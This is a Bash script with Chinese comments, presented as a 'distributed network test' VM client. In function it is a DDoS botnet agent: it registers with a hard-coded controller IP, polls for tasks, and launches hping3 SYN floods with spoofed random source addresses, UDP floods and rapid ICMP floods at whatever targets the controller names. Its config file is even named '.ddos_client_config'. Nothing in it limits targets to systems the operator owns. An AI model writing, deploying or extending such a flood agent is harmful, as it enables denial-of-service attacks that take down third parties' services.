#!/bin/bash

# 分散式網路測試系統 - VM客戶端
# 此腳本運行在各個VM上，與管理服務器通信並執行測試任務

# 配置變數
CONFIG_FILE="$HOME/.ddos_client_config"
LOG_FILE="/var/log/vm_client.log"
HEARTBEAT_INTERVAL=30
MAX_RETRIES=3
RETRY_DELAY=5

# 顏色定義
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# 日誌函數
log() {
    local level=$1
    shift
    local message="$@"
    local timestamp=$(date '+%Y-%m-%d %H:%M:%S')
    echo -e "${timestamp} [${level}] ${message}" | tee -a "$LOG_FILE"
}

log_info() {
    log "INFO" "${GREEN}$@${NC}"
}

log_warn() {
    log "WARN" "${YELLOW}$@${NC}"
}

log_error() {
    log "ERROR" "${RED}$@${NC}"
}

log_debug() {
    log "DEBUG" "${BLUE}$@${NC}"
}

# 檢查依賴
check_dependencies() {
    local missing_deps=()
    
    # 檢查必要工具
    for cmd in curl jq hping3; do
        if ! command -v $cmd &> /dev/null; then
            missing_deps+=($cmd)
        fi
    done
    
    # 檢查bc計算器（用於統計計算）
    if ! command -v bc &> /dev/null; then
        log_warn "缺少bc計算器，可能影響統計計算精度"
        missing_deps+=("bc")
    fi
    
    if [ ${#missing_deps[@]} -ne 0 ]; then
        log_error "缺少必要工具: ${missing_deps[*]}"
        log_info "請安裝缺少的工具:"
        
        # 根據系統提供安裝建議
        if command -v apt-get &> /dev/null; then
            log_info "Ubuntu/Debian: sudo apt-get install curl jq hping3 bc"
        elif command -v yum &> /dev/null; then
            log_info "CentOS/RHEL: sudo yum install curl jq hping3 bc"
        elif command -v dnf &> /dev/null; then
            log_info "Fedora: sudo dnf install curl jq hping3 bc"
        fi
        
        log_warn "注意: hping3需要root權限才能執行SYN flood和UDP flood測試"
        
        exit 1
    fi
    
    # 檢查hping3權限
    if [ "$EUID" -ne 0 ]; then
        log_warn "當前不是root用戶，hping3可能無法執行某些測試"
        log_warn "建議使用sudo運行此腳本以獲得完整功能"
    fi
}

# 獲取本機信息
get_local_info() {
    VM_ID=$(hostname)
    IP_ADDRESS=$(curl -s ifconfig.me 2>/dev/null || curl -s ipinfo.io/ip 2>/dev/null || hostname -I | awk '{print $1}')
    HOSTNAME=$(hostname)
    
    if [ -z "$IP_ADDRESS" ]; then
        IP_ADDRESS=$(ip route get 8.8.8.8 | awk -F"src " 'NR==1{split($2,a," ");print a[1]}')
    fi
    
    log_info "本機信息: VM_ID=$VM_ID, IP=$IP_ADDRESS, HOSTNAME=$HOSTNAME"
}

# 載入配置
load_config() {
    if [ -f "$CONFIG_FILE" ]; then
        source "$CONFIG_FILE"
        log_info "載入配置文件: $CONFIG_FILE"
    else
        log_warn "配置文件不存在，需要初始化配置"
        setup_config
    fi
    
    # 驗證配置
    if [ -z "$MASTER_HOST" ] || [ -z "$MASTER_PORT" ]; then
        log_error "配置不完整，請重新配置"
        setup_config
    fi
}

# 設置配置
setup_config() {
    log_info "=== 分散式網路測試系統 - 客戶端配置 ==="
    
    # 獲取管理服務器信息
    while [ -z "$MASTER_HOST" ]; do
        read -p "請輸入管理服務器IP地址: " MASTER_HOST
        MASTER_HOST=${MASTER_HOST:-35.221.159.186}
        if [ -z "$MASTER_HOST" ]; then
            log_warn "管理服務器IP不能為空"
        fi
    done
    
    read -p "請輸入管理服務器端口 (預設: 5050): " MASTER_PORT
    MASTER_PORT=${MASTER_PORT:-5050}
    
    read -p "請輸入心跳間隔秒數 (預設: 30): " HEARTBEAT_INTERVAL
    HEARTBEAT_INTERVAL=${HEARTBEAT_INTERVAL:-30}
    
    # 保存配置
    cat > "$CONFIG_FILE" << EOF
# 分散式網路測試系統客戶端配置
MASTER_HOST="$MASTER_HOST"
MASTER_PORT="$MASTER_PORT"
HEARTBEAT_INTERVAL="$HEARTBEAT_INTERVAL"
EOF
    
    log_info "配置已保存到: $CONFIG_FILE"
}

# API調用函數
api_call() {
    local method=$1
    local endpoint=$2
    local data=$3
    local retry_count=0
    
    while [ $retry_count -lt $MAX_RETRIES ]; do
        local response
        if [ "$method" = "POST" ] && [ -n "$data" ]; then
            response=$(curl -s -X POST \
                -H "Content-Type: application/json" \
                -d "$data" \
                "http://$MASTER_HOST:$MASTER_PORT$endpoint" 2>/dev/null)
        else
            response=$(curl -s -X "$method" \
                "http://$MASTER_HOST:$MASTER_PORT$endpoint" 2>/dev/null)
        fi
        
        if [ $? -eq 0 ] && [ -n "$response" ]; then
            echo "$response"
            return 0
        fi
        
        retry_count=$((retry_count + 1))
        if [ $retry_count -lt $MAX_RETRIES ]; then
            log_warn "API調用失敗，$RETRY_DELAY 秒後重試 ($retry_count/$MAX_RETRIES)"
            sleep $RETRY_DELAY
        fi
    done
    
    log_error "API調用失敗: $method $endpoint"
    return 1
}

# 註冊VM
register_vm() {
    log_info "正在註冊VM到管理服務器..."
    
    local data=$(cat << EOF
{
    "vm_id": "$VM_ID",
    "ip_address": "$IP_ADDRESS",
    "hostname": "$HOSTNAME"
}
EOF
)
    
    local response=$(api_call "POST" "/api/vm/connect" "$data")
    if [ $? -eq 0 ]; then
        local success=$(echo "$response" | jq -r '.success // false' 2>/dev/null)
        if [ "$success" = "true" ]; then
            log_info "VM註冊成功"
            return 0
        else
            local message=$(echo "$response" | jq -r '.message // "未知錯誤"' 2>/dev/null)
            log_error "VM註冊失敗: $message"
        fi
    fi
    
    return 1
}

# 發送心跳
send_heartbeat() {
    local data=$(cat << EOF
{
    "vm_id": "$VM_ID"
}
EOF
)
    
    local response=$(api_call "POST" "/api/vm/heartbeat" "$data")
    if [ $? -eq 0 ]; then
        local success=$(echo "$response" | jq -r '.success // false' 2>/dev/null)
        if [ "$success" = "true" ]; then
            log_debug "心跳發送成功"
            return 0
        fi
    fi
    
    log_warn "心跳發送失敗"
    return 1
}

# 獲取待執行任務
get_pending_tasks() {
    local response=$(api_call "GET" "/api/tasks/pending/$VM_ID")
    if [ $? -eq 0 ]; then
        local success=$(echo "$response" | jq -r '.success // false' 2>/dev/null)
        if [ "$success" = "true" ]; then
            echo "$response" | jq -r '.data // []'
            return 0
        fi
    fi
    
    return 1
}

# 提交任務結果
submit_task_result() {
    local task_id=$1
    local status=$2
    local packets_sent=$3
    local packets_received=$4
    local packet_loss_rate=$5
    local avg_response_time=$6
    local min_response_time=$7
    local max_response_time=$8
    local error_message=$9
    
    local data=$(cat << EOF
{
    "task_id": "$task_id",
    "vm_id": "$VM_ID",
    "status": "$status",
    "packets_sent": $packets_sent,
    "packets_received": $packets_received,
    "packet_loss_rate": $packet_loss_rate,
    "avg_response_time": $avg_response_time,
    "min_response_time": $min_response_time,
    "max_response_time": $max_response_time,
    "error_message": "$error_message"
}
EOF
)
    
    local response=$(api_call "POST" "/api/tasks/result" "$data")
    if [ $? -eq 0 ]; then
        local success=$(echo "$response" | jq -r '.success // false' 2>/dev/null)
        if [ "$success" = "true" ]; then
            log_info "任務結果提交成功: $task_id"
            return 0
        fi
    fi
    
    log_error "任務結果提交失敗: $task_id"
    return 1
}

# 執行並發連接測試
execute_connection_test() {
    local target_ip=$1
    local target_port=$2
    local test_type=$3
    local packet_size=$4
    local connection_count=$5
    local duration=$6
    
    log_info "開始執行 $test_type 並發連接測試: $target_ip:$target_port (連接數: $connection_count)"
    
    case "$test_type" in
        "TCP")
            execute_tcp_connection_test "$target_ip" "$target_port" "$connection_count" "$duration"
            ;;
        "UDP")
            execute_udp_test "$target_ip" "$target_port" "$packet_size" "$connection_count" "$duration"
            ;;
        "ICMP")
            execute_icmp_test "$target_ip" "$packet_size" "$connection_count" "$duration"
            ;;
        *)
            log_error "不支持的測試類型: $test_type"
            return 1
            ;;
    esac
}

# 執行TCP並發連接測試（使用hping3 SYN flood）
execute_tcp_connection_test() {
    local target_ip=$1
    local target_port=$2
    local connection_count=$3
    local duration=$4
    
    log_info "執行TCP SYN flood測試到 $target_ip:$target_port，持續 $duration 秒"
    
    local output_file="/tmp/hping3_tcp_output_$$"
    
    # 使用hping3進行TCP SYN flood測試
    # -S: TCP SYN包
    # -p: 目標端口
    # --flood: flood模式，盡可能快地發送包
    # --rand-source: 隨機源IP地址
    local cmd="hping3 -S -p $target_port --flood --rand-source $target_ip"
    
    log_debug "執行TCP SYN flood命令 (持續${duration}秒): $cmd"
    
    timeout $duration bash -c "$cmd > $output_file 2>&1"
    local exit_code=$?
    
    if [ $exit_code -eq 124 ]; then
        log_info "TCP SYN flood測試在 $duration 秒後正常結束"
    elif [ $exit_code -eq 1 ]; then
        log_debug "TCP SYN flood測試完成（無回應是正常的）"
    elif [ $exit_code -eq 2 ]; then
        log_debug "TCP SYN flood測試因SIGINT結束（正常）"
    else
        log_warn "hping3 TCP SYN flood退出碼: $exit_code，繼續處理結果"
    fi
    
    # 解析結果（不管退出碼如何都嘗試解析）
    if [ -f "$output_file" ]; then
        parse_hping3_results "$output_file" "$duration"
        rm -f "$output_file"
    else
        log_error "找不到TCP SYN flood輸出文件"
        return 1
    fi
    
    return 0
}

# 執行UDP測試（使用hping3 UDP flood）
execute_udp_test() {
    local target_ip=$1
    local target_port=$2
    local packet_size=$3
    local connection_count=$4
    local duration=$5
    
    log_info "執行UDP flood測試: $target_ip:$target_port，持續 $duration 秒"
    
    local output_file="/tmp/hping3_udp_output_$$"
    
    # 使用hping3進行UDP flood測試
    # --udp: UDP模式
    # --flood: flood模式，盡可能快地發送包
    # -p: 目標端口
    local cmd="hping3 --udp --flood -p $target_port $target_ip"
    
    log_debug "執行UDP flood命令 (持續${duration}秒): $cmd"
    
    timeout $duration bash -c "$cmd > $output_file 2>&1"
    local exit_code=$?
    
    if [ $exit_code -eq 124 ]; then
        log_info "UDP flood測試在 $duration 秒後正常結束"
    elif [ $exit_code -eq 1 ]; then
        log_debug "UDP flood測試完成（無回應是正常的）"
    elif [ $exit_code -eq 2 ]; then
        log_debug "UDP flood測試因SIGINT結束（正常）"
    else
        log_warn "hping3 UDP flood退出碼: $exit_code，繼續處理結果"
    fi
    
    # 解析結果（不管退出碼如何都嘗試解析）
    if [ -f "$output_file" ]; then
        parse_hping3_results "$output_file" "$duration"
        rm -f "$output_file"
    else
        log_error "找不到UDP flood輸出文件"
        return 1
    fi
    
    return 0
}

# 執行ICMP測試（使用hping3）
execute_icmp_test() {
    local target_ip=$1
    local packet_size=$2
    local connection_count=$3
    local duration=$4
    
    log_info "執行ICMP測試: $target_ip，持續 $duration 秒"
    
    local output_file="/tmp/hping3_icmp_output_$$"
    
    # 使用持續時間而不是包數量
    # -i u100 表示每100微秒發送一包
    local cmd="hping3 -1 -d $packet_size -i u100 $target_ip"
    
    log_debug "執行ICMP命令 (持續${duration}秒): $cmd"
    
    timeout $duration bash -c "$cmd > $output_file 2>&1"
    local exit_code=$?
    
    if [ $exit_code -eq 124 ]; then
        log_info "ICMP測試在 $duration 秒後正常結束"
    elif [ $exit_code -eq 1 ]; then
        log_debug "ICMP測試完成（無回應是正常的）"
    elif [ $exit_code -eq 2 ]; then
        log_debug "ICMP測試因SIGINT結束（正常）"
    else
        log_warn "hping3 ICMP退出碼: $exit_code，繼續處理結果"
    fi
    
    # 解析結果（不管退出碼如何都嘗試解析）
    if [ -f "$output_file" ]; then
        parse_hping3_results "$output_file" "$duration"
        rm -f "$output_file"
    else
        log_error "找不到ICMP輸出文件"
        return 1
    fi
    
    return 0
}

# 解析hping3結果（支援flood模式）
parse_hping3_results() {
    local output_file=$1
    local duration=${2:-30}  # 默認30秒
    
    # 初始化變數
    packets_sent=0
    packets_received=0
    packet_loss_rate=0
    avg_response_time=0
    min_response_time=0
    max_response_time=0
    
    log_debug "開始解析hping3輸出文件: $output_file (測試時長: ${duration}秒)"
    
    # 顯示輸出文件內容以便調試
    # if [ -f "$output_file" ]; then
    #     log_debug "hping3輸出內容:"
    #     while IFS= read -r line; do
    #         log_debug "  $line"
    #     done < "$output_file"
    # fi
    
    # 從輸出中提取統計信息
    if grep -q "packets transmitted" "$output_file"; then
        # 解析發送和接收的包數
        local stats_line=$(grep "packets transmitted" "$output_file")
        log_debug "統計行: $stats_line"
        
        packets_sent=$(echo "$stats_line" | grep -o '[0-9]\+ packets transmitted' | grep -o '[0-9]\+' | head -1)
        packets_received=$(echo "$stats_line" | grep -o '[0-9]\+ received' | grep -o '[0-9]\+' | head -1)
        
        # 計算丟包率
        if [ "$packets_sent" -gt 0 ]; then
            packet_loss_rate=$(echo "scale=2; 100 * ($packets_sent - $packets_received) / $packets_sent" | bc -l 2>/dev/null || echo "0")
        fi
        
        # 解析響應時間
        if grep -q "round-trip" "$output_file"; then
            local rtt_line=$(grep "round-trip" "$output_file")
            log_debug "響應時間行: $rtt_line"
            
            # 使用更精確的正則表達式
            if echo "$rtt_line" | grep -q "min/avg/max"; then
                min_response_time=$(echo "$rtt_line" | sed 's/.*min\/avg\/max[^=]*= *\([0-9.]*\)\/.*/\1/')
                avg_response_time=$(echo "$rtt_line" | sed 's/.*min\/avg\/max[^=]*= *[0-9.]*\/\([0-9.]*\)\/.*/\1/')
                max_response_time=$(echo "$rtt_line" | sed 's/.*min\/avg\/max[^=]*= *[0-9.]*\/[0-9.]*\/\([0-9.]*\).*/\1/')
            fi
        fi
    else
        # Flood模式特殊處理
        # 檢查是否是flood模式（通常沒有詳細統計）
        log_debug "可能是flood模式，嘗試計算發送包數"
        
        # 計算收到的回復數量
        packets_received=$(grep -c "bytes from" "$output_file" 2>/dev/null || echo "0")
        
        # 嘗試從輸出中解析發送的包數
        if grep -q "HPING" "$output_file"; then
            # 計算HPING行數作為發送包數的近似值
            local hping_lines=$(grep -c "HPING" "$output_file" 2>/dev/null || echo "0")
            if [ "$hping_lines" -gt 0 ]; then
                packets_sent=$hping_lines
            fi
        fi
        
        # 如果仍然無法獲取發送包數，根據flood模式特性估算
        if [ "$packets_sent" -eq 0 ]; then
            # Flood模式通常每秒可發送數千到數萬包，這裡用保守估算
            # 考慮系統性能和網路限制，每秒約1000-10000包
            local estimated_rate=5000  # 每秒5000包的中等估算
            packets_sent=$((estimated_rate * duration))
            log_debug "使用估算的發送包數: $packets_sent (基於 ${estimated_rate}包/秒 × ${duration}秒)"
        fi
        
        # 計算丟包率
        if [ "$packets_sent" -gt 0 ]; then
            packet_loss_rate=$(echo "scale=2; 100 * ($packets_sent - $packets_received) / $packets_sent" | bc -l 2>/dev/null || echo "0")
        fi
        
        # 嘗試提取響應時間（如果有的話）
        if grep -q "time=" "$output_file"; then
            local times=$(grep -o 'time=[0-9.]\+' "$output_file" | grep -o '[0-9.]\+')
            if [ -n "$times" ]; then
                local time_count=$(echo "$times" | wc -l)
                if [ "$time_count" -gt 0 ]; then
                    avg_response_time=$(echo "$times" | awk '{sum+=$1; count++} END {if(count>0) print sum/count; else print 0}')
                    min_response_time=$(echo "$times" | sort -n | head -1)
                    max_response_time=$(echo "$times" | sort -n | tail -1)
                fi
            fi
        fi
        
        # 如果是flood模式且沒有收到回復，這是正常的
        if [ "$packets_received" -eq 0 ]; then
            log_debug "Flood模式測試完成，未收到回復（這在flood測試中是正常的）"
        fi
    fi
    
    # 確保數值格式正確且不為空
    packets_sent=${packets_sent:-0}
    packets_received=${packets_received:-0}
    packet_loss_rate=${packet_loss_rate:-0}
    avg_response_time=${avg_response_time:-0}
    min_response_time=${min_response_time:-0}
    max_response_time=${max_response_time:-0}
    
    # 驗證數值格式
    if ! [[ "$packets_sent" =~ ^[0-9]+$ ]]; then
        packets_sent=0
    fi
    if ! [[ "$packets_received" =~ ^[0-9]+$ ]]; then
        packets_received=0
    fi
    
    log_info "測試結果: 發送=$packets_sent, 接收=$packets_received, 丟包率=$packet_loss_rate%, 平均響應時間=${avg_response_time}ms"
}

# 執行任務
execute_task() {
    local task=$1
    
    # 解析任務參數
    local task_id=$(echo "$task" | jq -r '.task_id')
    local target_ip=$(echo "$task" | jq -r '.target_ip')
    local target_port=$(echo "$task" | jq -r '.target_port')
    local test_type=$(echo "$task" | jq -r '.test_type')
    local packet_size=$(echo "$task" | jq -r '.packet_size')
    local connection_count=$(echo "$task" | jq -r '.connection_count')
    local duration=$(echo "$task" | jq -r '.duration')
    
    log_info "執行任務: $task_id ($test_type $target_ip:$target_port, 並發連接數: $connection_count)"
    
    # 提交開始狀態
    submit_task_result "$task_id" "running" 0 0 0 0 0 0 ""
    
    # 執行測試
    if execute_connection_test "$target_ip" "$target_port" "$test_type" "$packet_size" "$connection_count" "$duration"; then
        # 提交成功結果
        submit_task_result "$task_id" "completed" "$packets_sent" "$packets_received" "$packet_loss_rate" "$avg_response_time" "$min_response_time" "$max_response_time" ""
    else
        # 提交失敗結果
        submit_task_result "$task_id" "failed" 0 0 0 0 0 0 "測試執行失敗"
    fi
}

# 處理待執行任務
process_pending_tasks() {
    local tasks=$(get_pending_tasks)
    if [ $? -eq 0 ] && [ "$tasks" != "[]" ] && [ "$tasks" != "null" ]; then
        local task_count=$(echo "$tasks" | jq '. | length' 2>/dev/null || echo "0")
        if [ "$task_count" -gt 0 ]; then
            log_info "發現 $task_count 個待執行任務"
            
            # 逐個執行任務
            echo "$tasks" | jq -c '.[]' | while read -r task; do
                execute_task "$task"
            done
        fi
    fi
}

# 優雅退出
graceful_exit() {
    log_info "接收到退出信號，正在優雅退出..."
    
    # 發送下線通知
    local data=$(cat << EOF
{
    "vm_id": "$VM_ID"
}
EOF
)
    
    api_call "POST" "/api/vm/disconnect" "$data" >/dev/null 2>&1
    log_info "VM已下線"
    exit 0
}

# 主循環
main_loop() {
    log_info "進入主循環，心跳間隔: ${HEARTBEAT_INTERVAL}秒"
    
    local heartbeat_counter=0
    
    while true; do
        # 發送心跳
        if [ $heartbeat_counter -le 0 ]; then
            send_heartbeat
            heartbeat_counter=$HEARTBEAT_INTERVAL
        fi
        
        # 處理待執行任務
        process_pending_tasks
        
        # 等待1秒並減少心跳計數器
        sleep 1
        heartbeat_counter=$((heartbeat_counter - 1))
    done
}

# 顯示幫助信息
show_help() {
    cat << EOF
分散式網路測試系統 - VM客戶端

用法: $0 [選項]

選項:
    -h, --help          顯示此幫助信息
    -c, --config        重新配置客戶端
    -t, --test          測試連接到管理服務器
    -d, --daemon        以守護進程模式運行
    -v, --version       顯示版本信息
    
示例:
    $0                  正常運行客戶端
    $0 -c              重新配置管理服務器信息
    $0 -t              測試與管理服務器的連接
    $0 -d              以守護進程模式運行
    
日誌文件: $LOG_FILE
配置文件: $CONFIG_FILE
EOF
}

# 測試連接
test_connection() {
    log_info "測試與管理服務器的連接..."
    
    if register_vm; then
        log_info "✅ 連接測試成功"
        return 0
    else
        log_error "❌ 連接測試失敗"
        return 1
    fi
}

# 以守護進程模式運行
run_as_daemon() {
    log_info "以守護進程模式啟動..."
    
    # 檢查是否已經有實例在運行
    local pidfile="/var/run/vm_client.pid"
    
    if [ -f "$pidfile" ]; then
        local old_pid=$(cat "$pidfile")
        if kill -0 "$old_pid" 2>/dev/null; then
            log_error "客戶端已經在運行 (PID: $old_pid)"
            exit 1
        else
            rm -f "$pidfile"
        fi
    fi
    
    # 啟動守護進程
    nohup bash "$0" > "$LOG_FILE" 2>&1 &
    local pid=$!
    echo "$pid" > "$pidfile"
    
    log_info "守護進程已啟動 (PID: $pid)"
    log_info "日誌文件: $LOG_FILE"
    log_info "使用 'kill $pid' 停止服務"
}

# 主函數
main() {
    # 設置信號處理
    trap graceful_exit SIGTERM SIGINT
    
    # 解析命令行參數
    case "${1:-}" in
        -h|--help)
            show_help
            exit 0
            ;;
        -c|--config)
            setup_config
            exit 0
            ;;
        -t|--test)
            check_dependencies
            get_local_info
            load_config
            test_connection
            exit $?
            ;;
        -d|--daemon)
            check_dependencies
            get_local_info
            load_config
            run_as_daemon
            exit 0
            ;;
        -v|--version)
            echo "分散式網路測試系統客戶端 v1.0"
            exit 0
            ;;
        "")
            # 正常運行模式
            ;;
        *)
            echo "未知選項: $1"
            echo "使用 '$0 --help' 查看幫助信息"
            exit 1
            ;;
    esac
    
    # 檢查依賴
    check_dependencies
    
    # 獲取本機信息
    get_local_info
    
    # 載入配置
    load_config
    
    # 註冊VM
    if ! register_vm; then
        log_error "VM註冊失敗，退出"
        exit 1
    fi
    
    # 進入主循環
    main_loop
}

# 確保日誌目錄存在
mkdir -p "$(dirname "$LOG_FILE")" 2>/dev/null || true

# 如果不是root用戶，使用用戶主目錄下的日誌文件
if [ "$EUID" -ne 0 ]; then
    LOG_FILE="$HOME/vm_client.log"
fi

# 啟動主函數
main "$@"
